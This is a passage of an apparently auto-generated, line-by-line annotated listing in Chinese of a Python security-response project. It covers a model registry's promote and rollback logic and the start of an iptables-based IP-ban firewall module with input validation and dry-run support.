| 169 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    "reason": "invalid_version_dir_or_manifest",` |
| 170 | 代码语句：参与当前文件的业务流程或数据处理。 | `                },` |
| 171 | 函数调用：执行已有函数/方法完成当前步骤。 | `            )` |
| 172 | 返回结果：把处理后的值交回调用方。 | `            return False` |
| 173 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        prev_marker = self._read_current_marker(root)` |
| 174 | 异常保护：尝试执行可能失败的逻辑。 | `        try:` |
| 175 | 函数调用：执行已有函数/方法完成当前步骤。 | `            mp, man = load_manifest_from_version_dir(vdir)` |
| 176 | 函数调用：执行已有函数/方法完成当前步骤。 | `            self.validate_manifest_for_family(family, man)` |
| 177 | 代码语句：参与当前文件的业务流程或数据处理。 | `            del mp` |
| 178 | 异常处理：捕获错误并执行降级或记录逻辑。 | `        except (ManifestLoadError, OSError, ValueError) as exc:` |
| 179 | 函数调用：执行已有函数/方法完成当前步骤。 | `            _audit(` |
| 180 | 代码语句：参与当前文件的业务流程或数据处理。 | `                self._audit_sink,` |
| 181 | 代码语句：参与当前文件的业务流程或数据处理。 | `                "promote_manifest_rejected",` |
| 182 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                {"family": family, "version": version_id, "error": str(exc)},` |
| 183 | 函数调用：执行已有函数/方法完成当前步骤。 | `            )` |
| 184 | 日志记录：输出运行状态、调试信息或异常线索。 | `            logger.error("[ModelRegistry] promote 校验 manifest 失败: %s", exc)` |
| 185 | 返回结果：把处理后的值交回调用方。 | `            return False` |
| 186 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 187 | 异常保护：尝试执行可能失败的逻辑。 | `        try:` |
| 188 | 函数调用：执行已有函数/方法完成当前步骤。 | `            detector.load_model(os.path.abspath(vdir))` |
| 189 | 异常处理：捕获错误并执行降级或记录逻辑。 | `        except Exception as exc:  # noqa: BLE001` |
| 190 | 日志记录：输出运行状态、调试信息或异常线索。 | `            logger.error("[ModelRegistry] promote 加载权重失败: %s", exc)` |
| 191 | 函数调用：执行已有函数/方法完成当前步骤。 | `            _audit(` |
| 192 | 代码语句：参与当前文件的业务流程或数据处理。 | `                self._audit_sink,` |
| 193 | 代码语句：参与当前文件的业务流程或数据处理。 | `                "model_load_failed",` |
| 194 | 代码语句：参与当前文件的业务流程或数据处理。 | `                {` |
| 195 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    "family": family,` |
| 196 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    "version": version_id,` |
| 197 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    "phase": "promote",` |
| 198 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    "error": str(exc),` |
| 199 | 代码语句：参与当前文件的业务流程或数据处理。 | `                },` |
| 200 | 函数调用：执行已有函数/方法完成当前步骤。 | `            )` |
| 201 | 函数调用：执行已有函数/方法完成当前步骤。 | `            self._recover_detector(family, detector, root, prev_marker)` |
| 202 | 返回结果：把处理后的值交回调用方。 | `            return False` |
| 203 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 204 | 异常保护：尝试执行可能失败的逻辑。 | `        try:` |
| 205 | 函数调用：执行已有函数/方法完成当前步骤。 | `            self._atomic_set_current(root, version_id)` |
| 206 | 异常处理：捕获错误并执行降级或记录逻辑。 | `        except OSError as exc:` |
| 207 | 日志记录：输出运行状态、调试信息或异常线索。 | `            logger.error("[ModelRegistry] 写入 current 失败: %s", exc)` |
| 208 | 函数调用：执行已有函数/方法完成当前步骤。 | `            _audit(` |
| 209 | 代码语句：参与当前文件的业务流程或数据处理。 | `                self._audit_sink,` |
| 210 | 代码语句：参与当前文件的业务流程或数据处理。 | `                "current_write_failed",` |
| 211 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                {"family": family, "version": version_id, "error": str(exc)},` |
| 212 | 函数调用：执行已有函数/方法完成当前步骤。 | `            )` |
| 213 | 函数调用：执行已有函数/方法完成当前步骤。 | `            self._recover_detector(family, detector, root, prev_marker)` |
| 214 | 返回结果：把处理后的值交回调用方。 | `            return False` |
| 215 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 216 | 条件判断：满足条件时进入对应分支。 | `        if prev_marker and prev_marker != version_id:` |
| 217 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            self._last_good_version[family] = prev_marker` |
| 218 | 函数调用：执行已有函数/方法完成当前步骤。 | `        _audit(` |
| 219 | 代码语句：参与当前文件的业务流程或数据处理。 | `            self._audit_sink,` |
| 220 | 代码语句：参与当前文件的业务流程或数据处理。 | `            "model_version_promoted",` |
| 221 | 代码语句：参与当前文件的业务流程或数据处理。 | `            {` |
| 222 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "family": family,` |
| 223 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "from_version": prev_marker,` |
| 224 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "to_version": version_id,` |
| 225 | 代码语句：参与当前文件的业务流程或数据处理。 | `            },` |
| 226 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 227 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        cb = self._reload_lock_callbacks.get(family)` |
| 228 | 条件判断：满足条件时进入对应分支。 | `        if cb:` |
| 229 | 异常保护：尝试执行可能失败的逻辑。 | `            try:` |
| 230 | 函数调用：执行已有函数/方法完成当前步骤。 | `                cb()` |
| 231 | 异常处理：捕获错误并执行降级或记录逻辑。 | `            except Exception as exc:  # noqa: BLE001` |
| 232 | 日志记录：输出运行状态、调试信息或异常线索。 | `                logger.debug("[ModelRegistry] reload hook: %s", exc)` |
| 233 | 返回结果：把处理后的值交回调用方。 | `        return True` |
| 234 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 235 | 函数定义：声明 `rollback` 的输入、处理逻辑和返回结果。 | `    def rollback(self, family: str, detector: "BaseDetector") -> bool:` |
| 236 | 函数调用：执行已有函数/方法完成当前步骤。 | `        self._ensure_family(family)` |
| 237 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        target = self._last_good_version.get(family)` |
| 238 | 条件判断：满足条件时进入对应分支。 | `        if not target:` |
| 239 | 函数调用：执行已有函数/方法完成当前步骤。 | `            _audit(` |
| 240 | 代码语句：参与当前文件的业务流程或数据处理。 | `                self._audit_sink,` |
| 241 | 代码语句：参与当前文件的业务流程或数据处理。 | `                "rollback_rejected",` |
| 242 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                {"family": family, "reason": "no_previous_version_recorded"},` |
| 243 | 函数调用：执行已有函数/方法完成当前步骤。 | `            )` |
| 244 | 返回结果：把处理后的值交回调用方。 | `            return False` |
| 245 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        root = self.family_root(family)` |
| 246 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        vdir = os.path.join(root, target)` |
| 247 | 条件判断：满足条件时进入对应分支。 | `        if not self._is_valid_version_dir(vdir):` |
| 248 | 函数调用：执行已有函数/方法完成当前步骤。 | `            _audit(` |
| 249 | 代码语句：参与当前文件的业务流程或数据处理。 | `                self._audit_sink,` |
| 250 | 代码语句：参与当前文件的业务流程或数据处理。 | `                "rollback_rejected",` |
| 251 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                {"family": family, "version": target, "reason": "version_dir_invalid"},` |
| 252 | 函数调用：执行已有函数/方法完成当前步骤。 | `            )` |
| 253 | 返回结果：把处理后的值交回调用方。 | `            return False` |
| 254 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        from_marker = self._read_current_marker(root)` |
| 255 | 条件判断：满足条件时进入对应分支。 | `        if not self._load_detector_at(` |
| 256 | 函数调用：执行已有函数/方法完成当前步骤。 | `            family, detector, os.path.abspath(vdir), audit_key="rollback_load"` |
| 257 | 代码语句：参与当前文件的业务流程或数据处理。 | `        ):` |
| 258 | 返回结果：把处理后的值交回调用方。 | `            return False` |
| 259 | 异常保护：尝试执行可能失败的逻辑。 | `        try:` |
| 260 | 函数调用：执行已有函数/方法完成当前步骤。 | `            self._atomic_set_current(root, target)` |
| 261 | 异常处理：捕获错误并执行降级或记录逻辑。 | `        except OSError as exc:` |
| 262 | 日志记录：输出运行状态、调试信息或异常线索。 | `            logger.error("[ModelRegistry] rollback 写 current 失败: %s", exc)` |
| 263 | 返回结果：把处理后的值交回调用方。 | `            return False` |
| 264 | 函数调用：执行已有函数/方法完成当前步骤。 | `        _audit(` |
| 265 | 代码语句：参与当前文件的业务流程或数据处理。 | `            self._audit_sink,` |
| 266 | 代码语句：参与当前文件的业务流程或数据处理。 | `            "model_version_rollback",` |
| 267 | 代码语句：参与当前文件的业务流程或数据处理。 | `            {` |
| 268 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "family": family,` |
| 269 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "from_version": from_marker,` |
| 270 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "to_version": target,` |
| 271 | 代码语句：参与当前文件的业务流程或数据处理。 | `            },` |
| 272 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 273 | 返回结果：把处理后的值交回调用方。 | `        return True` |
| 274 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 275 | 装饰器：为下面的函数或类附加框架行为。 | `    @staticmethod` |
| 276 | 函数定义：声明 `_ensure_family` 的输入、处理逻辑和返回结果。 | `    def _ensure_family(family: str) -> None:` |
| 277 | 条件判断：满足条件时进入对应分支。 | `        if family not in LEGACY_PRIMARY_FILE:` |
| 278 | 抛出异常：主动报告不可继续的错误。 | `            raise ValueError(f"未知模型家族: {family}")` |
| 279 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 280 | 装饰器：为下面的函数或类附加框架行为。 | `    @staticmethod` |
| 281 | 函数定义：声明 `_is_valid_version_dir` 的输入、处理逻辑和返回结果。 | `    def _is_valid_version_dir(vdir: str) -> bool:` |
| 282 | 返回结果：把处理后的值交回调用方。 | `        return os.path.isdir(vdir) and os.path.isfile(` |
| 283 | 函数调用：执行已有函数/方法完成当前步骤。 | `            os.path.join(vdir, "manifest.json")` |
| 284 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 285 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 286 | 函数定义：声明 `_load_detector_at` 的输入、处理逻辑和返回结果。 | `    def _load_detector_at(` |
| 287 | 代码语句：参与当前文件的业务流程或数据处理。 | `        self,` |
| 288 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        family: str,` |
| 289 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        detector: "BaseDetector",` |
| 290 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        path: str,` |
| 291 | 代码语句：参与当前文件的业务流程或数据处理。 | `        *,` |
| 292 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        audit_key: str,` |
| 293 | 代码语句：参与当前文件的业务流程或数据处理。 | `    ) -> bool:` |
| 294 | 异常保护：尝试执行可能失败的逻辑。 | `        try:` |
| 295 | 函数调用：执行已有函数/方法完成当前步骤。 | `            detector.load_model(path)` |
| 296 | 异常处理：捕获错误并执行降级或记录逻辑。 | `        except Exception as exc:  # noqa: BLE001` |
| 297 | 日志记录：输出运行状态、调试信息或异常线索。 | `            logger.error(` |
| 298 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "[ModelRegistry] 加载失败 family=%s path=%s: %s", family, path, exc` |
| 299 | 函数调用：执行已有函数/方法完成当前步骤。 | `            )` |
| 300 | 函数调用：执行已有函数/方法完成当前步骤。 | `            _audit(` |
| 301 | 代码语句：参与当前文件的业务流程或数据处理。 | `                self._audit_sink,` |
| 302 | 代码语句：参与当前文件的业务流程或数据处理。 | `                "model_load_failed",` |
| 303 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                {"family": family, "path": path, "phase": audit_key, "error": str(exc)},` |
| 304 | 函数调用：执行已有函数/方法完成当前步骤。 | `            )` |
| 305 | 异常保护：尝试执行可能失败的逻辑。 | `            try:` |
| 306 | 函数调用：执行已有函数/方法完成当前步骤。 | `                detector.clear_ml_state()` |
| 307 | 异常处理：捕获错误并执行降级或记录逻辑。 | `            except Exception:  # noqa: BLE001` |
| 308 | 占位语句：保持语法完整但当前不执行操作。 | `                pass` |
| 309 | 返回结果：把处理后的值交回调用方。 | `            return False` |
| 310 | 异常保护：尝试执行可能失败的逻辑。 | `        try:` |
| 311 | 条件判断：满足条件时进入对应分支。 | `            if os.path.isdir(path) and os.path.isfile(os.path.join(path, "manifest.json")):` |
| 312 | 函数调用：执行已有函数/方法完成当前步骤。 | `                _, man = load_manifest_from_version_dir(path)` |
| 313 | 函数调用：执行已有函数/方法完成当前步骤。 | `                self.validate_manifest_for_family(family, man)` |
| 314 | 条件分支：前面条件不满足时继续判断。 | `            elif os.path.isfile(path):` |
| 315 | 导入对象：从指定模块引入类、函数或常量。 | `                from src.schema.manifest import load_manifest_for_model_path` |
| 316 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 317 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                man = load_manifest_for_model_path(path)` |
| 318 | 函数调用：执行已有函数/方法完成当前步骤。 | `                self.validate_manifest_for_family(family, man)` |
| 319 | 异常处理：捕获错误并执行降级或记录逻辑。 | `        except Exception as exc:  # noqa: BLE001` |
| 320 | 日志记录：输出运行状态、调试信息或异常线索。 | `            logger.error("[ModelRegistry] 加载后家族校验失败: %s", exc)` |
| 321 | 函数调用：执行已有函数/方法完成当前步骤。 | `            _audit(` |
| 322 | 代码语句：参与当前文件的业务流程或数据处理。 | `                self._audit_sink,` |
| 323 | 代码语句：参与当前文件的业务流程或数据处理。 | `                "model_family_mismatch",` |
| 324 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                {"family": family, "path": path, "error": str(exc)},` |
| 325 | 函数调用：执行已有函数/方法完成当前步骤。 | `            )` |
| 326 | 异常保护：尝试执行可能失败的逻辑。 | `            try:` |
| 327 | 函数调用：执行已有函数/方法完成当前步骤。 | `                detector.clear_ml_state()` |
| 328 | 异常处理：捕获错误并执行降级或记录逻辑。 | `            except Exception:  # noqa: BLE001` |
| 329 | 占位语句：保持语法完整但当前不执行操作。 | `                pass` |
| 330 | 返回结果：把处理后的值交回调用方。 | `            return False` |
| 331 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 332 | 函数调用：执行已有函数/方法完成当前步骤。 | `        _audit(` |
| 333 | 代码语句：参与当前文件的业务流程或数据处理。 | `            self._audit_sink,` |
| 334 | 代码语句：参与当前文件的业务流程或数据处理。 | `            "model_load_ok",` |
| 335 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            {"family": family, "path": path, "phase": audit_key},` |
| 336 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 337 | 返回结果：把处理后的值交回调用方。 | `        return True` |
| 338 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 339 | 函数定义：声明 `_recover_detector` 的输入、处理逻辑和返回结果。 | `    def _recover_detector(` |
| 340 | 代码语句：参与当前文件的业务流程或数据处理。 | `        self,` |
| 341 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        family: str,` |
| 342 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        detector: "BaseDetector",` |
| 343 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        root: str,` |
| 344 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        prev_marker: Optional[str],` |
| 345 | 代码语句：参与当前文件的业务流程或数据处理。 | `    ) -> None:` |
| 346 | 条件判断：满足条件时进入对应分支。 | `        if not prev_marker:` |
| 347 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            legacy = os.path.join(self.model_dir, LEGACY_PRIMARY_FILE[family])` |
| 348 | 条件判断：满足条件时进入对应分支。 | `            if os.path.isfile(legacy):` |
| 349 | 异常保护：尝试执行可能失败的逻辑。 | `                try:` |
| 350 | 函数调用：执行已有函数/方法完成当前步骤。 | `                    detector.load_model(legacy)` |
| 351 | 异常处理：捕获错误并执行降级或记录逻辑。 | `                except Exception:` |
| 352 | 异常保护：尝试执行可能失败的逻辑。 | `                    try:` |
| 353 | 函数调用：执行已有函数/方法完成当前步骤。 | `                        detector.clear_ml_state()` |
| 354 | 异常处理：捕获错误并执行降级或记录逻辑。 | `                    except Exception:` |
| 355 | 占位语句：保持语法完整但当前不执行操作。 | `                        pass` |
| 356 | 兜底分支：处理前面条件都不满足的情况。 | `            else:` |
| 357 | 异常保护：尝试执行可能失败的逻辑。 | `                try:` |
| 358 | 函数调用：执行已有函数/方法完成当前步骤。 | `                    detector.clear_ml_state()` |
| 359 | 异常处理：捕获错误并执行降级或记录逻辑。 | `                except Exception:` |
| 360 | 占位语句：保持语法完整但当前不执行操作。 | `                    pass` |
| 361 | 返回结果：把处理后的值交回调用方。 | `            return` |
| 362 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        prev_dir = os.path.join(root, prev_marker)` |
| 363 | 条件判断：满足条件时进入对应分支。 | `        if self._is_valid_version_dir(prev_dir):` |
| 364 | 异常保护：尝试执行可能失败的逻辑。 | `            try:` |
| 365 | 函数调用：执行已有函数/方法完成当前步骤。 | `                detector.load_model(os.path.abspath(prev_dir))` |
| 366 | 异常处理：捕获错误并执行降级或记录逻辑。 | `            except Exception as exc:  # noqa: BLE001` |
| 367 | 日志记录：输出运行状态、调试信息或异常线索。 | `                logger.error("[ModelRegistry] 恢复上一版本失败: %s", exc)` |
| 368 | 异常保护：尝试执行可能失败的逻辑。 | `                try:` |
| 369 | 函数调用：执行已有函数/方法完成当前步骤。 | `                    detector.clear_ml_state()` |
| 370 | 异常处理：捕获错误并执行降级或记录逻辑。 | `                except Exception:` |
| 371 | 占位语句：保持语法完整但当前不执行操作。 | `                    pass` |
| 372 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 373 | 装饰器：为下面的函数或类附加框架行为。 | `    @staticmethod` |
| 374 | 函数定义：声明 `_read_current_marker` 的输入、处理逻辑和返回结果。 | `    def _read_current_marker(family_root: str) -> Optional[str]:` |
| 375 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        cur = os.path.join(family_root, "current")` |
| 376 | 条件判断：满足条件时进入对应分支。 | `        if os.path.islink(cur):` |
| 377 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            raw = os.readlink(cur)` |
| 378 | 条件判断：满足条件时进入对应分支。 | `            if os.path.isabs(raw):` |
| 379 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                base = os.path.basename(os.path.normpath(raw))` |
| 380 | 兜底分支：处理前面条件都不满足的情况。 | `            else:` |
| 381 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                base = os.path.normpath(raw).replace("\\", "/").split("/")[-1]` |
| 382 | 返回结果：把处理后的值交回调用方。 | `            return base or None` |
| 383 | 条件判断：满足条件时进入对应分支。 | `        if os.path.isdir(cur):` |
| 384 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            real = os.path.realpath(cur)` |
| 385 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            parent = os.path.realpath(family_root)` |
| 386 | 条件判断：满足条件时进入对应分支。 | `            if real == parent:` |
| 387 | 返回结果：把处理后的值交回调用方。 | `                return None` |
| 388 | 条件判断：满足条件时进入对应分支。 | `            if os.path.dirname(real) == parent:` |
| 389 | 返回结果：把处理后的值交回调用方。 | `                return os.path.basename(real)` |
| 390 | 条件判断：满足条件时进入对应分支。 | `        if os.path.isfile(cur) and not os.path.islink(cur):` |
| 391 | 异常保护：尝试执行可能失败的逻辑。 | `            try:` |
| 392 | 上下文管理：自动管理资源打开与释放。 | `                with open(cur, encoding="utf-8") as fh:` |
| 393 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    line = fh.readline().strip()` |
| 394 | 返回结果：把处理后的值交回调用方。 | `                return line or None` |
| 395 | 异常处理：捕获错误并执行降级或记录逻辑。 | `            except OSError:` |
| 396 | 返回结果：把处理后的值交回调用方。 | `                return None` |
| 397 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        cur_txt = os.path.join(family_root, "current.txt")` |
| 398 | 条件判断：满足条件时进入对应分支。 | `        if os.path.isfile(cur_txt):` |
| 399 | 异常保护：尝试执行可能失败的逻辑。 | `            try:` |
| 400 | 上下文管理：自动管理资源打开与释放。 | `                with open(cur_txt, encoding="utf-8") as fh:` |
| 401 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    line = fh.readline().strip()` |
| 402 | 返回结果：把处理后的值交回调用方。 | `                return line or None` |
| 403 | 异常处理：捕获错误并执行降级或记录逻辑。 | `            except OSError:` |
| 404 | 返回结果：把处理后的值交回调用方。 | `                return None` |
| 405 | 返回结果：把处理后的值交回调用方。 | `        return None` |
| 406 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 407 | 装饰器：为下面的函数或类附加框架行为。 | `    @staticmethod` |
| 408 | 函数定义：声明 `_atomic_set_current` 的输入、处理逻辑和返回结果。 | `    def _atomic_set_current(family_root: str, version_id: str) -> None:` |
| 409 | 函数调用：执行已有函数/方法完成当前步骤。 | `        os.makedirs(family_root, exist_ok=True)` |
| 410 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        target_txt = os.path.join(family_root, "current.txt")` |
| 411 | 函数调用：执行已有函数/方法完成当前步骤。 | `        fd, tmp = tempfile.mkstemp(` |
| 412 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            prefix="current_", suffix=".txt", dir=family_root, text=True` |
| 413 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 414 | 异常保护：尝试执行可能失败的逻辑。 | `        try:` |
| 415 | 上下文管理：自动管理资源打开与释放。 | `            with os.fdopen(fd, "w", encoding="utf-8") as fh:` |
| 416 | 函数调用：执行已有函数/方法完成当前步骤。 | `                fh.write(version_id.strip() + "\n")` |
| 417 | 函数调用：执行已有函数/方法完成当前步骤。 | `            os.replace(tmp, target_txt)` |
| 418 | 异常处理：捕获错误并执行降级或记录逻辑。 | `        except Exception:` |
| 419 | 异常保护：尝试执行可能失败的逻辑。 | `            try:` |
| 420 | 条件判断：满足条件时进入对应分支。 | `                if os.path.exists(tmp):` |
| 421 | 函数调用：执行已有函数/方法完成当前步骤。 | `                    os.remove(tmp)` |
| 422 | 异常处理：捕获错误并执行降级或记录逻辑。 | `            except OSError:` |
| 423 | 占位语句：保持语法完整但当前不执行操作。 | `                pass` |
| 424 | 代码语句：参与当前文件的业务流程或数据处理。 | `            raise` |
| 425 | 条件判断：满足条件时进入对应分支。 | `        if os.name != "nt":` |
| 426 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            sym = os.path.join(family_root, "current")` |
| 427 | 异常保护：尝试执行可能失败的逻辑。 | `            try:` |
| 428 | 条件判断：满足条件时进入对应分支。 | `                if os.path.islink(sym) or os.path.isfile(sym):` |
| 429 | 函数调用：执行已有函数/方法完成当前步骤。 | `                    os.remove(sym)` |
| 430 | 函数调用：执行已有函数/方法完成当前步骤。 | `                os.symlink(version_id, sym, target_is_directory=True)` |
| 431 | 异常处理：捕获错误并执行降级或记录逻辑。 | `            except OSError:` |
| 432 | 占位语句：保持语法完整但当前不执行操作。 | `                pass` |

## `src/response/__init__.py`

- 类型：自动响应
- 行数：6

| 行号 | 备注 | 原始代码 |
|---:|---|---|
| 1 | 代码语句：参与当前文件的业务流程或数据处理。 | `﻿"""响应闭环子包：responder、通知、防火墙、调度与持久化。"""` |
| 2 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 3 | 导入对象：从指定模块引入类、函数或常量。 | `from src.response.ip_validate import validate_ip` |
| 4 | 导入对象：从指定模块引入类、函数或常量。 | `from src.response.responder import SecurityResponder` |
| 5 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 6 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `__all__ = ["SecurityResponder", "validate_ip"]` |

## `src/response/firewall.py`

- 类型：自动响应
- 行数：138

| 行号 | 备注 | 原始代码 |
|---:|---|---|
| 1 | 文档字符串边界：开始或结束模块/类/函数说明。 | `"""` |
| 2 | 代码语句：参与当前文件的业务流程或数据处理。 | `FirewallManager 抽象：iptables 实现 + Windows / 云安全组占位。` |
| 3 | 文档字符串边界：开始或结束模块/类/函数说明。 | `"""` |
| 4 | 兼容性导入：启用较新的 Python 语义。 | `from __future__ import annotations` |
| 5 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 6 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import logging` |
| 7 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import subprocess` |
| 8 | 导入对象：从指定模块引入类、函数或常量。 | `from abc import ABC, abstractmethod` |
| 9 | 导入对象：从指定模块引入类、函数或常量。 | `from dataclasses import dataclass` |
| 10 | 导入对象：从指定模块引入类、函数或常量。 | `from typing import List, Optional` |
| 11 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 12 | 导入对象：从指定模块引入类、函数或常量。 | `from src.response.ip_validate import validate_ip` |
| 13 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 14 | 日志记录：输出运行状态、调试信息或异常线索。 | `logger = logging.getLogger(__name__)` |
| 15 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 16 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `_SUBPROCESS_TIMEOUT = 5` |
| 17 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 18 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 19 | 装饰器：为下面的函数或类附加框架行为。 | `@dataclass` |
| 20 | 类定义：声明 `FirewallResult`，封装相关状态与行为。 | `class FirewallResult:` |
| 21 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    ok: bool` |
| 22 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    dry_run: bool` |
| 23 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    message: str` |
| 24 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    command: Optional[List[str]] = None` |
| 25 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 26 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 27 | 类定义：声明 `FirewallManager`，封装相关状态与行为。 | `class FirewallManager(ABC):` |
| 28 | 文档字符串：说明当前模块、类或函数的职责。 | `    """统一封禁 / 解封接口。"""` |
| 29 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 30 | 装饰器：为下面的函数或类附加框架行为。 | `    @abstractmethod` |
| 31 | 函数定义：声明 `ban_input_drop` 的输入、处理逻辑和返回结果。 | `    def ban_input_drop(self, ip: str, *, dry_run: bool) -> FirewallResult:` |
| 32 | 代码语句：参与当前文件的业务流程或数据处理。 | `        ...` |
| 33 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 34 | 装饰器：为下面的函数或类附加框架行为。 | `    @abstractmethod` |
| 35 | 函数定义：声明 `unban_input_drop` 的输入、处理逻辑和返回结果。 | `    def unban_input_drop(self, ip: str, *, dry_run: bool) -> FirewallResult:` |
| 36 | 代码语句：参与当前文件的业务流程或数据处理。 | `        ...` |
| 37 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 38 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 39 | 类定义：声明 `IptablesFirewallManager`，封装相关状态与行为。 | `class IptablesFirewallManager(FirewallManager):` |
| 40 | 文档字符串：说明当前模块、类或函数的职责。 | `    """Linux iptables（列表参数，禁止 shell=True）。"""` |
| 41 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 42 | 函数定义：声明 `ban_input_drop` 的输入、处理逻辑和返回结果。 | `    def ban_input_drop(self, ip: str, *, dry_run: bool) -> FirewallResult:` |
| 43 | 条件判断：满足条件时进入对应分支。 | `        if not validate_ip(ip):` |
| 44 | 返回结果：把处理后的值交回调用方。 | `            return FirewallResult(False, dry_run, "invalid_ip")` |
| 45 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        ip = ip.strip()` |
| 46 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        cmd = ["iptables", "-A", "INPUT", "-s", ip, "-j", "DROP"]` |
| 47 | 条件判断：满足条件时进入对应分支。 | `        if dry_run:` |
| 48 | 日志记录：输出运行状态、调试信息或异常线索。 | `            logger.info("[DRY RUN][iptables] 将执行封禁（未真实调用）: %s", " ".join(cmd))` |
| 49 | 返回结果：把处理后的值交回调用方。 | `            return FirewallResult(True, True, "dry_run_no_subprocess", command=list(cmd))` |
| 50 | 异常保护：尝试执行可能失败的逻辑。 | `        try:` |
| 51 | 函数调用：执行已有函数/方法完成当前步骤。 | `            subprocess.run(` |
| 52 | 代码语句：参与当前文件的业务流程或数据处理。 | `                cmd,` |
